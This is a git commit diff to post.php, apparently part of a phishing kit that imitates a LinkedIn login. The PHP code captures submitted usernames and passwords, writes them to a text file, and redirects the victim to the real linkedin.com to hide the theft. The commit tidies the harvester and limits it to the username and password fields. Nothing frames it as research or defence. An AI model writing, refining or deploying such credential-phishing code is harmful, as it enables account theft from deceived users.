b3c01c37147a7ce4d321c42cc646783e2c3ac243
NamrathaRU <107617940+NamrathaRU@users.noreply.github.com>
2024-10-28 19:12:50 +0530

    Update post.php

--- post.php
+++ post.php
@@ -1,17 +1,22 @@
 <?php
+// Set headers for file download
 header('Content-Disposition: attachment; filename="usernames.txt"');
 header('Content-Type: text/plain');
 
+// Open a file to write the username and password
 $handle = fopen("php://output", "w");
-foreach($_POST as $variable=>$value)
-{
-fwrite($handle,$variable);
-fwrite($handle,"-");
-fwrite($handle,$value);
-fwrite($handle,"\r\n");
+
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    // Write username and password to the file
+    fwrite($handle, "Username: " . $_POST['username'] . "\r\n");
+    fwrite($handle, "Password: " . $_POST['password'] . "\r\n");
+    fwrite($handle, "\r\n");
 }
-fwrite($handle,"\r\n");
+
+// Close the file handle
 fclose($handle);
-header("location:https://www.linkedin.com/");
+
+// Redirect to LinkedIn after processing
+header("Location: https://www.linkedin.com/");
 exit;
 ?>
